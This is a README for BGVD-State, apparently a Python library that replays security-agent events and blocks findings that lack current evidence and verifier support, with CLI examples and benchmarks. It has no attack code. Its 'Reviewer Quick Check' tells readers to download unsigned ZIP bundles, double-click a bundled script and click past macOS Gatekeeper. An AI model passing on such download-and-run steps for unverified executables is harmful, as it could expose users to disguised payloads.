# BGVD-State

BGVD-State, named after the Blackboard-Guided Vulnerability Discovery project,
is replayable state middleware for evidence-gated security-agent handoffs. It
sits between event producers and downstream consumers, records model, tool,
and human events, maintains candidate identity, binds material evidence and
verifier results, preserves failed paths, invalidates stale evidence, persists
state, and produces a compact handoff packet.

The safety-critical state transitions are deterministic. No API key, model
service, container, or live target is required to use the core package.

## Why It Exists

A prose summary can mention the right facts while losing the relations that
make a security finding valid: which evidence supports which candidate, whether
the verifier result is current, which paths have failed, and whether
finalization is allowed. BGVD-State makes those relations explicit and checks
them before a finding can be finalized.

This repository also contains the sanitized replay artifact used to evaluate
the middleware under security-specific state pressure. The intended use is a
long-running workflow in which candidate collisions, stale evidence, verifier
replacement, or repeated failed paths make a plain transcript insufficient.

## Installation

BGVD-State supports Python 3.10-3.12 and has no runtime dependencies.

```bash
python -m pip install .
```

For an editable development install:

```bash
python -m pip install -e .
```

## Reviewer Quick Check — No Installation

Choose the no-install ZIP that matches the reviewer's computer:

| Computer | Reviewer kit |
|---|---|
| Windows 10/11 x64 | [`BGVD-State-v1.1.1-Reviewer-Kit-Windows-x64.zip`](https://github.com/estigeralynhbettin-eng/bgvd-structured-state-artifact/releases/download/v1.1.1/BGVD-State-v1.1.1-Reviewer-Kit-Windows-x64.zip) |
| macOS Apple Silicon | [`BGVD-State-v1.1.1-Reviewer-Kit-macOS-Apple-Silicon.zip`](https://github.com/estigeralynhbettin-eng/bgvd-structured-state-artifact/releases/download/v1.1.1/BGVD-State-v1.1.1-Reviewer-Kit-macOS-Apple-Silicon.zip) |
| macOS Intel | [`BGVD-State-v1.1.1-Reviewer-Kit-macOS-Intel.zip`](https://github.com/estigeralynhbettin-eng/bgvd-structured-state-artifact/releases/download/v1.1.1/BGVD-State-v1.1.1-Reviewer-Kit-macOS-Intel.zip) |

Then:

1. Download the matching ZIP.
2. Extract the complete ZIP.
3. Double-click the Windows `.bat` or macOS `.command` file.

The result page opens automatically. The expected headline is:

```text
OVERALL RESULT: PASS
```

The reviewer kit includes its own isolated Python runtime and dependencies. It
does not use or modify a Python installation already present on the computer,
does not install packages, and does not require internet access, administrator
permission, an API key, a model call, Docker, a service, or a live target.

A `PASS` confirms that all 18 tests pass, the fixed case replays 23 events into
6 candidate lifecycles, 5 rejected candidates and 5 failed paths remain
visible, unsupported finalization is blocked with the expected gate exit code
`2`, and the offline artifact validator passes. The generated HTML result page
links to the raw log for every step.

Each asset is built and executed on its matching operating system and CPU
architecture in CI. Read the complete reviewer instructions and platform
boundary in
[`reviewer/00_READ_ME_FIRST.md`](reviewer/00_READ_ME_FIRST.md).

The macOS bundles are not notarized with a paid Apple Developer ID. On the
first launch after a browser download, Gatekeeper may require the standard
Control-click, **Open** confirmation. This is not an installation and does not
need administrator access. iOS/iPadOS is not supported. The source package
itself supports Python 3.10--3.12.

### Optional source-based check

Technical reviewers who prefer their own Python environment can run:

```bash
python -m pip install -e ".[dev]"
python -m unittest discover -s tests -v
python validate_structured_state_artifact.py \
  --artifact . \
  --out-dir artifact_validation_output
```

The expected test result is `Ran 18 tests` followed by `OK`; the expected
artifact-validation status is `PASS`.

## Complete Runtime Example

Replay the de-identified 23-event engineering case:

```bash
python -m bgvd_state replay \
  --events examples/discovery_runtime_case/events.json \
  --state-out state.json \
  --handoff-out handoff.json
python -m bgvd_state summary --state state.json
python -m bgvd_state gate --state state.json --candidate CASE-C06
```

The summary reports `23` events, `6` candidates, `5` rejected candidates, and
`5` retained failed paths. The gate returns
`"reasons": ["current_verifier_not_positive"]` and exits with status `2`.
This is the expected result: an earlier positive technical verifier remains
auditable, but the current scope verifier prevents the candidate from being
reported.

## Minimal Examples

Replay a sanitized candidate-replacement event stream:

```bash
python -m bgvd_state replay \
  --events examples/candidate_replacement/events.json \
  --state-out state.json \
  --handoff-out handoff.json
```

Check the current candidate:

```bash
python -m bgvd_state gate --state state.json --candidate C_CURRENT
```

The gate allows `C_CURRENT` and rejects `C_OLD`, whose evidence was invalidated.
The second example demonstrates that an old positive verifier cannot override a
current negative verifier:

```bash
python -m bgvd_state replay \
  --events examples/stale_verifier/events.json \
  --state-out stale-state.json \
  --handoff-out stale-handoff.json

python -m bgvd_state gate --state stale-state.json --candidate C_STALE
```

The final command exits with status `2` because finalization is rejected.

## Python API

```python
from bgvd_state import EvidenceLifecycle, Event, EventType, FinalizationGate

lifecycle = EvidenceLifecycle()
lifecycle.apply(Event(
    id="E0001",
    type=EventType.MATERIAL_EVIDENCE,
    summary="A redacted defensive observation.",
    candidate_id="C1",
))
lifecycle.apply(Event(
    id="E0002",
    type=EventType.VERIFIER_RESULT,
    summary="The current terminal verifier is positive.",
    candidate_id="C1",
    verifier_status=True,
))

decision = FinalizationGate().evaluate(lifecycle.state, "C1")
assert decision.allowed
```

## Runtime Components

- `EventStore`: append-only, unique event records with JSONL persistence.
- `EvidenceLifecycle`: deterministic event-to-state transitions.
- `Candidate`: proposed, partial, verified, rejected, superseded, or finalized.
- `FailedPath`: rejected routes and their evidence references.
- `FinalizationGate`: requires current material evidence and a current positive
  verifier result bound to the same candidate.
- `HandoffBuilder`: separates active, rejected, superseded, and finalized
  candidates and emits invalidated evidence, failed paths, frontier items, and
  finalization eligibility.

## Test and Validate

See **Reviewer Quick Check** above for the installation, test, validation
commands, and expected outputs.

The test suite runs on Windows and Linux with Python 3.10, 3.11, and 3.12 in
GitHub Actions. The artifact validator performs no model calls and starts no
services.

Runtime engineering validation and the fixed-candidate performance protocol are
documented in `docs/runtime-validation.md`. The released Windows benchmark uses
five repetitions per size:

| Events | Median replay (s) | Median end-to-end (s) | Peak Python MiB |
|---:|---:|---:|---:|
| 100 | 0.000726 | 0.006284 | 0.15 |
| 1,000 | 0.005263 | 0.050503 | 1.31 |
| 10,000 | 0.052356 | 0.558827 | 13.15 |
| 100,000 | 1.337475 | 13.300971 | 130.20 |

These environment-specific measurements hold the candidate set at six. They
are an engineering profile, not a speed advantage or a claim of
concurrent-writer, distributed-storage, or unbounded-candidate scaling.

## Sanitized Research Artifact

The root-level `v3*` and `phase9*` JSON/Markdown files are redacted replay
fixtures and result summaries. `REPRODUCE.md` maps the paper-facing contrasts to
those files. The release excludes live targets, credentials, operational
commands, network addresses, target-specific payloads, and direct reproduction
procedures.

The local defensive review that produced the source lifecycle covered fixed
revisions of `microsoft/TypeScript`, `django/django`, and `affaan-m/ECC`.
Repository names, commits, roles, counts, and source-stream hashes are listed in
`validation/runtime/authorized_review_use_manifest.json`. Candidate-specific
source locations and reproduction details remain excluded from the public case.

The bounded evidence represented in the artifact is:

- security-specific state semantics improve weak-to-strong handoff over the
  tested matched free-form, generic structured, and retrieval-memory controls
  under selected verifier-replay state pressure;
- pressure-reduced and unambiguous tasks show no measurable advantage over
  lighter logs or curated prose, which defines when the middleware is useful;
- the tested cross-family source-audit setting did not reproduce the same
  separation, so the released evidence supports a state-pressure condition
  rather than a universal representation claim.

## Licenses

Code under `src/`, `tests/`, `examples/`, and the standalone validator is MIT
licensed; see `LICENSE.txt`. Sanitized fixtures, result summaries, and artifact
documentation are CC BY 4.0; see `DATA_LICENSE.txt`.

## Responsible Use

Use this package only for defensive research, authorized environments, and
false-positive control. See `SECURITY.md` for disclosure guidance.
